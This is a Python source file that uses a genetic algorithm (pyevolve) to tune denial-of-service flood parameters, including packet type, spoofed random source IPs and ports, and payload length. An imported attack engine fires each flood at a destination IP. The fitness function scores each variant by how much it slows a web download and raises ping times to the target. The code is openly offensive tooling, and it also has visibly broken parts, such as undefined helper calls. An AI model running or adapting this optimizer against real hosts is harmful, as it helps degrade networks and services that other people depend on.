from time import time
from threading import Thread

from attack_engine import *
import requests
import pyping

from pyevolve import GenomeBase
from pyevolve import Util
from enum import Enum


def stopwatch(func):
    def measured(arg):
        start_time = time()
        func(arg)
        return time() - start_time

    return measured


@stopwatch
def download_url(url):
    r = requests.get(url)


def ping_avg(destination):
    r = pyping.ping(destination)
    return r.avg_rtt


def eval_func(genome):
    score = 0.0
    attack = Thread(target=startAttack, args=(genome.type, genome.duration, genome.interval, genome.random_source_ip, genome.random_source_port, genome.random_destination_port, genome.source_ip, genome.source_port, genome.destination_ip, genome.destination_port,genome.data_length))
    attack.start()
    sleep(genome.duration)
    #startAttack(genome.type, genome.duration, genome.interval, genome.random_source_ip,
     #                   genome.random_source_port, genome.random_destination_port, genome.source_ip, genome.source_port,
      #                  genome.destination_ip, genome.destination_port, genome.data_length)
    score = download_url('http://www.google.ru')
    ping = ping_avg(genome.destination_ip)
    if ping is None:
        ping = 10000
    score += float(ping)
    attack.join()
    return score


constants = {0: (AttackType.UDP, AttackType.TCP, AttackType.ICMP), 1: xrange(2), 2: xrange(1), 3: xrange(1),
             4: xrange(1), 5: xrange(1), 6: getRandomIp, 7: xrange(1024), 8: xrange(1024), 9: xrange(10)}


def rand_init(genome, i):
    if hasattr(constants[i], '__len__'):
        genome[i] = constants[i][randint(0, len(constants[i]) - 1)]
    else:
        genome[i] = constants[i]()
    return genome


def AttackInitializator(genome, **args):
    for i in xrange(len(genome)):
        genome = rand_init(genome, i)


def AttackMutator(genome, **args):
    if args["pmut"] <= 0.0:
        return 0
    listSize = len(genome)
    mutations = args["pmut"] * (listSize)

    if mutations < 1.0:
        mutations = 0
        for it in xrange(listSize):
            if Util.randomFlipCoin(args["pmut"]):
                genome[it] = rand_init(genome, it)
            mutations += 1

    else:
        for it in xrange(int(round(mutations))):
            which_gene = rand_randint(0, listSize - 1)
            genome[which_gene] = rand_init(genome, which_gene)

    return mutations


def AttackCrossover(genome, **args):
    sister = None
    brother = None
    gMom = args["mom"]
    gDad = args["dad"]

    sister = gMom.clone()
    brother = gDad.clone()
    sister.resetStats()
    brother.resetStats()

    for i in xrange(len(gMom)):
        if Util.randomFlipCoin(0.5):
            temp = sister[i]
            sister[i] = brother[i]
            brother[i] = temp

    return (sister, brother)


class AttackGenome(GenomeBase.GenomeBase):

    attack = startAttack

    def __len__(self):
        return len(self.to_array())

    def __init__(self, destination_ip, source_ip='192.168.1.1', source_port=20, destination_port=30, data_length=10,
                 duration=0, interval=0, random_source_ip=True, random_source_port=True, random_destination_port=True):
        GenomeBase.GenomeBase.__init__(self)
        self.initializator.set(AttackInitializator)
        self.mutator.set(AttackMutator)
        self.crossover.set(AttackCrossover)
        self.evaluator.set(eval_func)
        self.destination_ip = destination_ip
        self.type = AttackType.UDP
        self.duration = duration
        self.interval = interval
        self.random_source_ip = random_source_ip
        self.random_source_port = random_source_port
        self.random_destination_port = random_destination_port
        self.source_ip = source_ip
        self.source_port = source_port
        self.destination_port = destination_port
        self.data_length = data_length

    def to_array(self):
        return [self.type, self.duration, self.interval, self.random_source_ip, self.random_source_port,
                self.random_destination_port, self.source_ip, self.source_port, self.destination_port, self.data_length]

    def __getitem__(self, i):
        return self.to_array()[i]

    def __setitem__(self, i, item):
        if i == 0:
            self.type = item
        if i == 1:
            self.duration = item
        if i == 2:
            self.interval = item
        if i == 3:
            self.random_source_ip = item
        if i == 4:
            self.random_source_port = item
        if i == 5:
            self.random_destination_port = item
        if i == 6:
            self.source_ip = item
        if i == 7:
            self.source_port = item
        if i == 8:
            self.destination_port = item
        if i == 9:
            self.data_length = item

    def copy(self, g):
        g.type = self.type
        g.duration = self.duration
        g.interval = self.interval
        g.random_source_ip = self.random_source_ip
        g.random_source_port = self.random_source_port
        g.random_destination_port = self.random_destination_port
        g.source_ip = self.source_ip[:]
        g.source_port = self.source_port
        g.destination_port = self.destination_port
        g.data_length = self.data_length

    def clone(self):
        clone = AttackGenome(self.destination_ip)
        self.copy(clone)
        return clone
